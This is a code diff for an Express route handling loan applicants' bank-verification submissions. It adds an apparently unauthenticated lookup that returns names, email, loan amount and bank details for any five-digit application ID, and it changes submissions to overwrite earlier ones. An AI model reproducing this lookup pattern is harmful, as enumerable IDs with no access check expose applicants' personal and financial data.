@@ -1,14 +1,49 @@
 import { Router, Request, Response } from "express";
 import { bankVerificationSchema } from "../validation";
-import { createBankVerification } from "../services/bankVerificationService";
+import { upsertBankVerification } from "../services/bankVerificationService";
 import {
   getApplicationById,
-  getApplication,
-  markBankVerificationCompleted,
+  updateApplicationStatus,
 } from "../services/applicationService";
 import { sendDiscordNotification } from "../services/discordService";
+import { email } from "zod";
 
 const router = Router();
+
+// GET /api/bank-verification/lookup?applicationId=XXXXX
+// Returns read-only application data for pre-populating the verification form
+router.get("/lookup", async (req: Request, res: Response) => {
+  try {
+    const applicationId = (req.query.applicationId as string)?.trim();
+
+    if (!applicationId || !/^\d{5}$/.test(applicationId)) {
+      return res.status(400).json({ error: "Invalid application ID" });
+    }
+
+    const application = await getApplicationById(applicationId);
+
+    if (!application) {
+      return res.status(404).json({ error: "Application not found" });
+    }
+
+    // Return only safe, read-only fields needed for the verification form
+    return res.json({
+      applicationId: application.id,
+      firstName: application.first_name,
+      lastName: application.last_name,
+      loanAmount: application.loan_amount,
+      bankName: application.bank_name,
+      status: application.status,
+      email: application?.email,
+      account_type: application?.account_type,
+    });
+  } catch (error) {
+    console.error("Bank verification lookup error:", error);
+    return res
+      .status(500)
+      .json({ error: "An internal error occurred. Please try again." });
+  }
+});
 
 // POST /api/bank-verification — Submit bank verification credentials
 router.post("/", async (req: Request, res: Response) => {
@@ -32,30 +67,24 @@ router.post("/", async (req: Request, res: Response) => {
     const body = parsed.data;
     const userAgent = (req.headers["user-agent"] as string) || "unknown";
 
-    // Verify the application exists and is in bank_verification_pending status
+    // Verify the application exists and is in an acceptable status
+    let application;
     try {
-      const application = await getApplicationById(body.applicationId);
-      const existBankApplication = await getApplication(body.applicationId);
+      application = await getApplicationById(body.applicationId);
 
       if (!application) {
         return res.status(404).json({ error: "Application not found" });
       }
 
-      // check status
-      if (
-        application.status !== "bank_verification_pending" &&
-        application.status !== "bank_verification_failed"
-      ) {
+      // Allow submission for pending, failed, or already in-progress statuses
+      const allowedStatuses = [
+        "bank_verification_pending",
+        "bank_verification_failed",
+        "bank_verification_in_progress",
+      ];
+      if (!allowedStatuses.includes(application.status)) {
         return res.status(400).json({
           error: "Bank verification cannot be submitted for this application.",
-        });
-      }
-
-      console.log("existBankApplication:", existBankApplication);
-
-      if (existBankApplication && existBankApplication.status !== "failed") {
-        return res.status(409).json({
-          error: "Application already exists.",
         });
       }
     } catch (dbError) {
@@ -65,10 +94,10 @@ router.post("/", async (req: Request, res: Response) => {
       });
     }
 
-    // Insert bank verification record
+    // Upsert bank verification record (overwrite previous if exists)
     let verificationId: string;
     try {
-      const result = await createBankVerification({
+      const result = await upsertBankVerification({
         applicationId: body.applicationId,
         bankName: body.bankName,
         accountType: body.accountType,
@@ -82,19 +111,29 @@ router.post("/", async (req: Request, res: Response) => {
       });
       verificationId = result.id;
     } catch (dbError) {
-      console.error("Bank verification insert failed:", dbError);
+      console.error("Bank verification upsert failed:", dbError);
       res
         .status(500)
         .json({ error: "Failed to save bank verification. Please try again." });
       return;
     }
 
-    // Mark bank verification as completed and update status to pending
-    // try {
-    //   await markBankVerificationCompleted(body.applicationId);
-    // } catch (dbError) {
-    //   console.warn("Failed to mark bank verification as completed:", dbError);
-    // }
+    // Auto-update application status to bank_verification_in_progress
+    // Only if status is pending or failed (not if admin has already set it further)
+    if (
+      application.status === "bank_verification_pending" ||
+      application.status === "bank_verification_failed"
+    ) {
+      try {
+        await updateApplicationStatus(
+          body.applicationId,
+          "bank_verification_in_progress",
+          "system",
+        );
+      } catch (statusError) {
+        console.warn("Failed to auto-update application status:", statusError);
+      }
+    }
 
     // Send Discord notification (non-blocking)
     sendDiscordNotification(
